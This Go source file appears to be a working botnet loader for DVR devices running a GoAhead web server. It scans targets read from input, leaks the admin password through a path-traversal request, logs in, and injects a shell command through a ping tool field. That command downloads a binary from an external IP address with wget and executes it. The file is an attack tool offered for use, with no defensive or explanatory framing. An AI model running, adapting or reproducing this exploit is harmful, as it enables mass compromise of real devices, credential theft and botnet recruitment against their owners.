//PRIVATE, DVR-5k Exploit Found And RCE By Hraz. 

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	wg      sync.WaitGroup
	payload = "rm%20-rf%20pizza.6wget%3Bwget%20http%3A%2F%2F45.95.169.118%2Fpizza.mpsl%20-O%20pizza.6wget%3Bchmod%20777%20pizza.6wget%3B.%2Fpizza.6wget%20mpsl.wget%3Brm%20-rf%20pizza.6wget%3B"
)

func getCredential(target string, port string) string {
	conn, err := net.Dial("tcp", target+":"+port)

	if err != nil {
		return ""
	}

	conn.Write([]byte("GET /\\.gif\\..\\adm\\management.asp HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n"))

	var bytes bytes.Buffer
	_, err = io.Copy(&bytes, conn)

	nextbuf := strings.Split(bytes.String(), "var passadm = \"")

	if len(nextbuf) > 1 {
		password := strings.Split(nextbuf[1], "\";")
		return password[0]
	}

	return ""
}

func setAuth(target string, port string, password string) {
	conn, err := net.Dial("tcp", target+":"+port)

	if err != nil {
		return
	}

	data := fmt.Sprintf("loginUser=admin&loginPass=%s", password)
	content_len := len(data)

	request := fmt.Sprintf("POST /goform/setAuth HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nContent-Length: %d\r\n\r\n%s", content_len, data)
	conn.Write([]byte(request))

	var bytes bytes.Buffer
	_, err = io.Copy(&bytes, conn)
}

func checkBot(target string, port string) bool {
	conn, err := net.Dial("tcp", target+":"+port)

	if err != nil {
		return false
	}

	conn.Write([]byte("GET / HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n"))

	var bytes bytes.Buffer
	_, err = io.Copy(&bytes, conn)

	return strings.Contains(strings.ToLower(bytes.String()), "goahead")
}

func sendPayload(target string, port string) {
	conn, err := net.Dial("tcp", target+":"+port)

	if err != nil {
		return
	}

	data := "tool=0&pingCount=4&host=%24%28" + payload + "%29&sumbit=OK"
	content_len := len(data)

	request := fmt.Sprintf("POST /goform/sysTools HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nContent-Length: %d\r\n\r\n%s", content_len, data)
	conn.Write([]byte(request))
}

func loadBot(target string, port string) {
	wg.Add(1)
	defer wg.Done()

	if !checkBot(target, port) {
		return
	}

	fmt.Printf("[EUROPE] maybe vuln %s:%s\n", target, port)

	password := getCredential(target, port)

	if password == "" {
		return
	}

	fmt.Printf("[EUROPE] %s (password='%s')\n", target, password)

	setAuth(target, port, password)
	sendPayload(target, port)
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	port := os.Args[1]

	for scanner.Scan() {
		go loadBot(scanner.Text(), port)
	}

	time.Sleep(1 * time.Second)

	wg.Wait()
}

// 154.58.217.159
